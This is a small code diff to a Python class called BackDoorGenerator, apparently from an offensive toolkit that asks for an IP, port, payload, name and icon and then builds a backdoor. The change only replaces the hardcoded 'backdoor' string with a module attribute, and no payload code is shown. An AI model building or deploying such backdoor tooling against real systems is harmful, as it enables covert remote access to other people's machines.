@@ -14,6 +14,7 @@ class BackDoorGenerator(ModuleUtils):
         Initializes the ip, port and payload attributes.
         """
         super().__init__()
+        self.module  = "backdoor"
         self.ip      = ""
         self.port    = ""
         self.payload = ""
@@ -79,7 +80,7 @@ class BackDoorGenerator(ModuleUtils):
                 self.run()
         
         elif answer == "show payloads":
-            self.list_payloads("backdoor")
+            self.list_payloads(self.module)
 
         elif answer == "generate":
             if self.payload == "":
@@ -91,7 +92,7 @@ class BackDoorGenerator(ModuleUtils):
                 backdoor_icon = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Icon Of backdoor (Optional): ")
                 
                 self.pipeline(
-                    module="backdoor", payload=self.payload, ip=self.ip,
+                    module=self.module, payload=self.payload, ip=self.ip,
                     port=int(self.port), name=backdoor_name, icon_path=backdoor_icon)
                 
                 sys.exit(1)
